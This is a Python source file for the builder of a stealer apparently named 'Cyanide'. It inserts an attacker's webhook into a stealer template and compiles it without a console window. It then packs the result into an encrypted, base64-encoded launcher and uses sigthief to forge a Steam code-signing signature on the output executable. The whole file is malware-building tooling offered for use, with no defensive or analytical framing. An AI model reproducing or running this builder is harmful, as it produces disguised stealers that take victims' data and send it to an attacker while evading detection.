import string
import random
import click
import os
import shutil
import zipfile

from core.logs import banner

from colorama import Fore
from base64 import standard_b64encode as b64encode

stealerPath = os.path.join("core", "template", "main.tpl")
launcherPath = os.path.join("core", "template", "launcher.tpl")

def get_random_string(length=10) -> bytes:
    letters = string.ascii_lowercase
    result_str = ''.join(random.choice(letters) for i in range(length))
    return result_str.encode()

def zipfolder(foldername, target_dir, password: bytes):
    zipobj = zipfile.ZipFile(foldername + '.zip', 'w', zipfile.ZIP_DEFLATED)
    zipobj.setpassword(password)
    rootlen = len(target_dir) + 1
    for base, dirs, files in os.walk(target_dir):
        for file in files:
            fn = os.path.join(base, file)
            zipobj.write(fn, fn[rootlen:])


@click.command()
@click.argument("webhook", required=1, type=str)
@click.option('-o', "--output", type=str, required=1, help="Output file")
@click.option('-o', "--output", type=str, help="Output file")
@click.option('--debugging', is_flag=True)

def builder(webhook, output, debugging):
    password = get_random_string(20)

    stealerpy = output+".py"
    stealerzip = output+".zip"

    launcherpy = output+".l"

    banner.builder()
    print(f"{'-'*30} Configure Cyanide... {'-'*30}")
    
    with open(stealerPath, "r") as f:
        print(f"[{Fore.GREEN}${Fore.RESET}] Adding webhook...")
        template = f.read().replace(r"%webhook%", webhook)
    
    print(f"[{Fore.GREEN}${Fore.RESET}] Writing Cyanice...")
    
    with open(stealerpy, "w") as f:
        f.write(template)
    
    print(f"{'-'*30} Compiling Cyanide... {'-'*30}")
    if debugging:
        os.system("pyinstaller "+stealerpy)
    else:
        os.system("pyinstaller --noconsole "+stealerpy)

    os.remove(stealerpy)

    print(f"{'-'*30} Configure launcher... {'-'*30}")
    print(f"[{Fore.CYAN}*{Fore.RESET}] Folder zipping...")
    zipfolder(output, os.path.join("dist", output), password)

    zipbase64 = b64encode(open(stealerzip, "rb").read())
    os.remove(stealerzip)

    print(f"[{Fore.CYAN}*{Fore.RESET}] Setup launcher...")
    with open(launcherPath, "r") as f:
        template = f.read().replace(r"%b64zip%", 'b"'+zipbase64.decode()+'"')
        template = template.replace(r"%password%", 'b"'+password.decode()+'"')
        template = template.replace(r"%filexec%", '"'+output+".exe"+'"')
    
    print(f"[{Fore.GREEN}${Fore.RESET}] Writing launcher...")
    with open(launcherpy, "w") as f:
        f.write(template)
    
    print(f"[{Fore.CYAN}*{Fore.RESET}] Converting to exe...")
    
    if debugging:
        os.system("pyinstaller --onefile "+launcherpy)
    else:
        os.system("pyinstaller --onefile --noconsole "+launcherpy)
    
    print(f"[{Fore.CYAN}*{Fore.RESET}] Clearing...")
    
    os.remove(launcherpy)
    shutil.move(os.path.join("dist", output+".exe"), ".")

    shutil.rmtree("build")
    shutil.rmtree("dist")
    os.remove(output+".spec")

    print(f"[{Fore.RED}!{Fore.RESET}] Adding codesign to exe...")
    os.system(f"python tools/sigthief.py -t {output}.exe -i bin_sign/steam.exe -o {output}.exe")

if __name__ == "__main__":
    builder()